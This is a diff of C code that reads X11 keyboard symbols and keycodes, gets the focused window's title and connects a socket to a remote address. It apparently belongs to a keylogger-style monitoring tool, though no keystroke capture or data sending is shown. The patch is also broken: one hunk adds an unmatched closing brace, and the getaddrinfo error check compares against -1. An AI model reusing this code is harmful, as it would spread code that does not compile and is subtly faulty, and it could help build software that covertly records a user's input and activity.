@@ -177,7 +177,10 @@ char* get_kb_symbols(void)
  *            		to the value of the DISPLAY environment variable.
  */
 
-	display = XOpenDisplay(NULL);
+	if((display = XOpenDisplay(NULL)) == NULL)
+	{
+		return "Error: XOpenDisplay()";
+	}
 
 /*	
  *	NAME
@@ -200,7 +203,7 @@ char* get_kb_symbols(void)
  *  		a keyboard device.
  */
 	keyboardDesc = XkbAllocKeyboard();
-	if(keyboardDesc == NULL) {return "Error: XkbAllocKeyboard().";}
+	if(keyboardDesc == NULL) {return "Error: XkbAllocKeyboard()";}
 
 /*	
  *	NAME
@@ -293,7 +296,10 @@ char* get_kb_keycodes(void)
 	Atom keycodes;
 	char* atomName;
 
-	display = XOpenDisplay(NULL);
+	if((display = XOpenDisplay(NULL)) == NULL)
+	{
+		return "Error: XOpenDisplay()";} 
+	}
 	keyboardDesc = XkbAllocKeyboard();
 
 	if(keyboardDesc == NULL) {return "Error: XkbAllocKeyboard()";}
@@ -354,10 +360,9 @@ char* get_window_title(void)
 	unsigned long bytes_after_return, nitems_return, focused;
 	unsigned char *prop_return;
   
-  	if ((display = XOpenDisplay(0)) == NULL)
+  	if ((display = XOpenDisplay(NULL)) == NULL)
 	{
-		fprintf(stderr, "Unable to open Display\n");
-		return "No-Window";
+		return "No-Window - (\"Unable to open Display\")";
 	}
  
 	rwindow = XDefaultRootWindow(display);
@@ -409,27 +414,27 @@ int conn(char *addr, char *port)
 			hints.ai_canonname = NULL;
 			hints.ai_addr = NULL;
 			hints.ai_next = NULL;
-			hints.ai_socktype = SOCK_STREAM;
-			hints.ai_family = AF_UNSPEC;
-			hints.ai_flags = AI_NUMERICSERV;
+			hints.ai_socktype = 0; 		 //TCP  && UDP
+			hints.ai_family = AF_UNSPEC; 	 //IPv4 && IPv6
+			hints.ai_flags = AI_NUMERICSERV; //Interpret service as a numeric port number
 
 	if(getaddrinfo(addr, port, &hints, &result) ==-1)
-			{
-				fprintf(stderr,"Failed to get address info");
-			}
+	{
+		fprintf(stderr,"Failed to get address info");
+	}
 	for(rp = result; rp != NULL; rp = rp->ai_next)
 	{
 		lc = socket(rp->ai_family,rp->ai_socktype,rp->ai_protocol);
-		if(lc == -1)
-		{
+		if(lc == -1)				 //If socket has failed, try with the next addrinfo structure
+		{		
 			continue;
 		}
 		if(connect(lc, rp->ai_addr, rp->ai_addrlen) != -1)
-		{
+		{					 //If connect does not return an error, we can exit from the for-loop
 			break;
 		}
 
-		close(lc);
+		close(lc);				//Else close the socket and try with the next addrinfo structure
 	}
 	
 	if(rp == NULL)
